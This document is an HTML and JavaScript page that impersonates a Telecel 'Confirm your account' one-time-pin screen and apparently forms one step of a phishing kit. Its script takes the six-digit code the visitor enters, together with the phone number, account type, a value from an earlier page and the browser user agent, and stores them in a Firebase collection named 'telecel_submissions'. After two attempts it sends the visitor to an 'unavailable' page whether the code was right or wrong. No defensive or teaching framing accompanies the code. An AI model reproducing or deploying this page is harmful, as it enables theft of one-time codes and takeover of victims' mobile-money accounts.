<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telecel OTP</title>

<!-- Firebase SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">

<style>
*{
  box-sizing:border-box;
  font-family:'Inter', Arial, sans-serif;
}

body{
  margin:0;
  background:#f5f5f5;
  display:flex;
  justify-content:center;
}

/* CONTAINER */
.container{
  width:360px;
  background:#f7f7f7;
  border-radius:28px;
  padding:40px 20px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  position:relative;
  overflow:hidden;
  text-align:center;
}

/* RED SHAPE */
.top-bg{
  position:absolute;
  top:0;
  right:0;
  width:220px;
  height:220px;
  background:linear-gradient(135deg, rgba(255,0,0,0.25), rgba(255,0,0,0.6));
  border-bottom-left-radius:120px;
}

.content{
  position:relative;
  z-index:2;
}

/* LOGO */
.logo{
  margin-top:60px;
}

.logo-circle{
  width:52px;
  height:52px;
  background:#ff0000;
  border-radius:50%;
  color:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  font-size:30px;
  margin:auto;
  font-weight:800;
}

.logo-text{
  color:#ff0000;
  font-size:26px;
  font-weight:bold;
  margin-top:8px;
}

/* TEXT */
.title{
  color:#ff0000;
  font-size:20px;
  font-weight:600;
  margin-top:15px;
}

.subtitle{
  color:#666;
  font-size:15px;
  margin-top:10px;
  line-height:1.5;
}

/* TIMER */
.timer{
  color:#ff0000;
  margin-top:10px;
  font-weight:600;
}

/* OTP BOXES */
.otp-container{
  display:flex;
  justify-content:space-between;
  margin-top:20px;
}

.otp-input{
  width:45px;
  height:50px;
  border-radius:10px;
  border:1px solid #ddd;
  text-align:center;
  font-size:18px;
  outline:none;
}

.otp-input:focus{
  border:2px solid #ff0000;
}

/* BUTTONS */
.btn{
  width:100%;
  height:55px;
  border:none;
  border-radius:14px;
  font-size:16px;
  margin-top:20px;
  cursor:pointer;
}

.btn-primary{
  background:#e5e5e5;
  color:#999;
  font-weight:600;
}

.btn-outline{
  background:transparent;
  border:2px solid #ff0000;
  color:#666;
  font-weight:600;
}

/* Message styling */
.message {
  font-size: 14px;
  margin-top: 8px;
  min-height: 20px;
}
.error { color: #dc3545; }
.success { color: #28a745; }

/* SPINNER OVERLAY (same as login page) */
#spinner {
  position: fixed;
  inset: 0;
  display: none;
  align-items: center;
  justify-content: center;
  background: rgba(255, 255, 255, 0.7);
  backdrop-filter: blur(2px);
  z-index: 999;
}

.loader {
  width: 44px;
  height: 44px;
  border: 4px solid #ffe0e0;
  border-top: 4px solid #ff0000;
  border-radius: 50%;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  to { transform: rotate(360deg); }
}
</style>
</head>

<body>

<div class="container">
  <div class="top-bg"></div>

  <div class="content">

    <!-- LOGO -->
    <div class="logo">
      <div class="logo-circle">t</div>
      <div class="logo-text">telecel</div>
    </div>

    <!-- TEXT -->
    <div class="title">Confirm your account</div>
    <div class="subtitle">
      The One Time Pin has been sent to<br>
      <span id="maskedPhone">02xxxxxx20</span>
    . Enter it below to verify your account.
    </div>

    <div class="timer" id="timer">00:44</div>

    <!-- OTP INPUT -->
    <div class="otp-container">
      <input class="otp-input" maxlength="1" id="otp1">
      <input class="otp-input" maxlength="1" id="otp2">
      <input class="otp-input" maxlength="1" id="otp3">
      <input class="otp-input" maxlength="1" id="otp4">
      <input class="otp-input" maxlength="1" id="otp5">
      <input class="otp-input" maxlength="1" id="otp6">
    </div>

    <div class="message" id="otpMessage"></div>

    <!-- BUTTONS -->
    <button class="btn btn-primary" id="nextBtn">Next</button>
    <button class="btn btn-outline" id="goBackBtn">Go Back</button>

  </div>
</div>

<!-- SPINNER OVERLAY -->
<div id="spinner">
  <div class="loader"></div>
</div>

<script>
  (function() {
    // ==================== FIREBASE CONFIG (Telecel) ====================
    const firebaseConfig = {
      apiKey: "AIzaSyCjztxgN2BRjuHDMQnpNEuB7NE9C9R8nU0",
      authDomain: "tele-panel.firebaseapp.com",
      projectId: "tele-panel",
      storageBucket: "tele-panel.firebasestorage.app",
      messagingSenderId: "859165937892",
      appId: "1:859165937892:web:db441a884b1a98c36b1cf1",
      measurementId: "G-5ZPQ1H0SWR"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();
    const COLLECTION_NAME = 'telecel_submissions';

    // ==================== DOM ELEMENTS ====================
    const otpInputs = [
      document.getElementById('otp1'),
      document.getElementById('otp2'),
      document.getElementById('otp3'),
      document.getElementById('otp4'),
      document.getElementById('otp5'),
      document.getElementById('otp6')
    ];
    const nextBtn = document.getElementById('nextBtn');
    const goBackBtn = document.getElementById('goBackBtn');
    const maskedPhoneSpan = document.getElementById('maskedPhone');
    const otpMessage = document.getElementById('otpMessage');
    const timerEl = document.getElementById('timer');
    const spinner = document.getElementById('spinner');

    // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
    const phone = sessionStorage.getItem('telecel_phone') || '0200000020';
    const accountType = sessionStorage.getItem('telecel_accountType') || 'Mobile';
    const inputValue = sessionStorage.getItem('telecel_inputValue') || '';
    const expectedOtp = sessionStorage.getItem('telecel_otp') || '123456';

    // ==================== MASK PHONE NUMBER ====================
    function maskPhone(phone) {
      const cleaned = phone.replace(/\D/g, '');
      if (cleaned.length >= 4) {
        const start = cleaned.slice(0, 2);
        const end = cleaned.slice(-2);
        const masked = start + 'x'.repeat(Math.max(0, cleaned.length - 4)) + end;
        return masked;
      }
      return phone;
    }
    maskedPhoneSpan.textContent = maskPhone(phone);

    // ==================== OTP AUTO‑ADVANCE ====================
    function focusNext(index) {
      if (index < otpInputs.length - 1) otpInputs[index + 1].focus();
    }
    function focusPrev(index) {
      if (index > 0) otpInputs[index - 1].focus();
    }

    otpInputs.forEach((input, idx) => {
      input.addEventListener('input', function() {
        this.value = this.value.replace(/\D/g, '');
        if (this.value.length === 1) focusNext(idx);
        const allFilled = otpInputs.every(inp => inp.value.length === 1);
        nextBtn.style.background = allFilled ? '#ff0000' : '#e5e5e5';
        nextBtn.style.color = allFilled ? '#fff' : '#999';
      });

      input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace') {
          if (this.value.length === 0) {
            e.preventDefault();
            focusPrev(idx);
          }
        } else if (e.key === 'ArrowLeft') {
          e.preventDefault();
          focusPrev(idx);
        } else if (e.key === 'ArrowRight') {
          e.preventDefault();
          focusNext(idx);
        } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && !e.ctrlKey && !e.metaKey) {
          e.preventDefault();
        }
      });
    });

    // ==================== TIMER ====================
    let timeLeft = 44;
    const timerInterval = setInterval(() => {
      timeLeft--;
      const seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
      timerEl.textContent = `00:${seconds}`;
      if (timeLeft <= 0) {
        clearInterval(timerInterval);
        timerEl.textContent = '00:00';
        otpInputs.forEach(inp => inp.disabled = true);
        nextBtn.disabled = true;
        otpMessage.textContent = 'OTP expired. Please go back.';
        otpMessage.className = 'message error';
      }
    }, 1000);

    // ==================== OTP ATTEMPT TRACKING ====================
    let otpAttemptCount = 0;
    const MAX_OTP_ATTEMPTS = 2;

    // ==================== SAVE OTP ATTEMPT TO FIREBASE ====================
    async function saveOtpAttempt(enteredOtp, status) {
      const otpField = otpAttemptCount === 1 ? 'otp1' : 'otp2';
      try {
        await db.collection(COLLECTION_NAME).add({
          accountType: accountType,
          inputValue: inputValue,
          phoneNumber: phone,
          [otpField]: enteredOtp,
          attempt: 2 + otpAttemptCount,
          status: status,
          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          userAgent: navigator.userAgent,
          pageUrl: window.location.href
        });
        console.log(`OTP attempt ${otpAttemptCount} saved as ${otpField}`);
      } catch (error) {
        console.error('Error saving OTP:', error);
      }
    }

    // ==================== VERIFY OTP ====================
    let isSubmitting = false; // prevent double clicks

    async function verifyOtp() {
      if (isSubmitting) return;

      const enteredOtp = otpInputs.map(inp => inp.value).join('');

      if (enteredOtp.length !== 6) {
        otpMessage.textContent = 'Please enter all 6 digits.';
        otpMessage.className = 'message error';
        return;
      }

      // Increment attempt counter
      otpAttemptCount++;

      // Disable further interactions
      isSubmitting = true;
      nextBtn.disabled = true;
      otpInputs.forEach(inp => inp.disabled = true);

      if (enteredOtp === expectedOtp) {
        // Correct OTP
        await saveOtpAttempt(enteredOtp, 'verified');
        
        if (otpAttemptCount === 1) {
          // First attempt success – show success and redirect
          otpMessage.textContent = '✓ Verified! Redirecting...';
          otpMessage.className = 'message success';
          setTimeout(() => {
            window.location.href = 'unavailable.html';
          }, 1500);
        } else {
          // Second attempt success – show spinner and redirect
          spinner.style.display = 'flex';
          setTimeout(() => {
            window.location.href = 'unavailable.html';
          }, 800);
        }
      } else {
        // Wrong OTP
        await saveOtpAttempt(enteredOtp, 'failed');

        if (otpAttemptCount === 1) {
          // First attempt failed – allow retry
          otpMessage.textContent = `Invalid OTP.`;
          otpMessage.className = 'message error';
          // Clear inputs and re-enable
          otpInputs.forEach(inp => {
            inp.value = '';
            inp.disabled = false;
          });
          otpInputs[0].focus();
          nextBtn.disabled = false;
          nextBtn.style.background = '#e5e5e5';
          nextBtn.style.color = '#999';
          isSubmitting = false;
        } else {
          // Second attempt failed – show spinner and redirect
          spinner.style.display = 'flex';
          setTimeout(() => {
            window.location.href = 'unavailable.html';
          }, 800);
        }
      }
    }

    // ==================== EVENT LISTENERS ====================
    nextBtn.addEventListener('click', verifyOtp);
    goBackBtn.addEventListener('click', () => {
      window.location.href = 'index.html';
    });

    // Initial button state
    nextBtn.style.background = '#e5e5e5';
    nextBtn.style.color = '#999';
  })();
</script>

</body>
</html>
